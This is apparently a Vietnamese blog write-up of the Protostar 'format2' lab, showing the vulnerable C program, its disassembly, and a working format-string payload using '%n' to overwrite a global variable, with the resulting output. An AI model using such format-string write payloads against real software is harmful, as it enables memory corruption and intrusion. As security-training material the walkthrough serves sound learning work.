---
layout: post
title: format2
---

Trong bài này, chúng ta sẽ dùng `printf` để exploit chương trình bằng cách ghi chính xác một giá trị vào một địa chỉ trên bộ nhớ.
Về cơ bản, chúng ta sẽ tiếp tục dùng phương pháp ở bài trước, `%n`, nhưng có quan tâm đến giá trị được ghi.

Sau đây là source code và asm code của chương trình format2.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```
```asm
0x08048454 <vuln+0>:    push   ebp
0x08048455 <vuln+1>:    mov    ebp,esp
0x08048457 <vuln+3>:    sub    esp,0x218
0x0804845d <vuln+9>:    mov    eax,ds:0x80496d8
0x08048462 <vuln+14>:   mov    DWORD PTR [esp+0x8],eax
0x08048466 <vuln+18>:   mov    DWORD PTR [esp+0x4],0x200
0x0804846e <vuln+26>:   lea    eax,[ebp-0x208]
0x08048474 <vuln+32>:   mov    DWORD PTR [esp],eax
0x08048477 <vuln+35>:   call   0x804835c <fgets@plt>
0x0804847c <vuln+40>:   lea    eax,[ebp-0x208]
0x08048482 <vuln+46>:   mov    DWORD PTR [esp],eax
0x08048485 <vuln+49>:   call   0x804837c <printf@plt>
0x0804848a <vuln+54>:   mov    eax,ds:0x80496e4
0x0804848f <vuln+59>:   cmp    eax,0x40
0x08048492 <vuln+62>:   jne    0x80484a2 <vuln+78>
0x08048494 <vuln+64>:   mov    DWORD PTR [esp],0x8048590
0x0804849b <vuln+71>:   call   0x804838c <puts@plt>
0x080484a0 <vuln+76>:   jmp    0x80484b9 <vuln+101>
0x080484a2 <vuln+78>:   mov    edx,DWORD PTR ds:0x80496e4
0x080484a8 <vuln+84>:   mov    eax,0x80485b0
0x080484ad <vuln+89>:   mov    DWORD PTR [esp+0x4],edx
0x080484b1 <vuln+93>:   mov    DWORD PTR [esp],eax
0x080484b4 <vuln+96>:   call   0x804837c <printf@plt>
0x080484b9 <vuln+101>:  leave
0x080484ba <vuln+102>:  ret
0x080484bb <main+0>:    push   ebp
0x080484bc <main+1>:    mov    ebp,esp
0x080484be <main+3>:    and    esp,0xfffffff0
0x080484c1 <main+6>:    call   0x8048454 <vuln>
0x080484c6 <main+11>:   mov    esp,ebp
0x080484c8 <main+13>:   pop    ebp
0x080484c9 <main+14>:   ret
```

Để tìm được địa chỉ của `target`, dùng objdump như bài trước.

```bash
objdump -t /opt/protostar/bin/format1 | grep target
```

Kết quả cho thấy `target` được lưu tại `0x080496e4`.
Chúng ta sẽ dựng formatted string dựa trên địa chỉ này.
Thành phần sẽ gồm 4 byte địa chỉ ở đầu. Tiếp theo, ta cần ghi thêm lệnh in 60 byte nữa trước khi sử dụng `%n` để ghi vào `target`.
Chúng ta cũng cần biết khoảng cách từ `esp` đến địa chỉ của formatted string.
Cách làm tương tự như bài trước, đó là dùng formatted string có cờ dạng `AAAA` ở đầu và các chuỗi `%x.` để xác định vị trí cờ sau khi in ra.

```bash
python -c "print 'AAAA' + '%x.' * 100"
```

Phép thử cho biết, khoảng cách này là 12 byte.
Và esp cần chạm đến tham số thứ 4 tại thời điểm ghi.
Sử dụng phương pháp đơn giản hóa, ta sẽ xây dựng formatted string thành:

```bash
python -c 'print "\xe4\x96\x04\x08" + "%60x" + "%4$n"'
```

Khi chạy thử, ta sẽ được kết quả như sau.

```bash
format2 <<< $(python -c 'print "\xe4\x96\x04\x08" + "%60x" + "%4$n"')
```
<pre class="memory">
                                                         200
<span style="color:aqua">you have modified the target :)</span>
</pre>

Mục tiêu hoàn thành!

## Ref
```bash
user@protostar:~$ format2 <<< $(python -c 'print "\xe4\x96\x04\x08" + "%60x" + "%4$n"')
                                                         200
you have modified the target :)
```
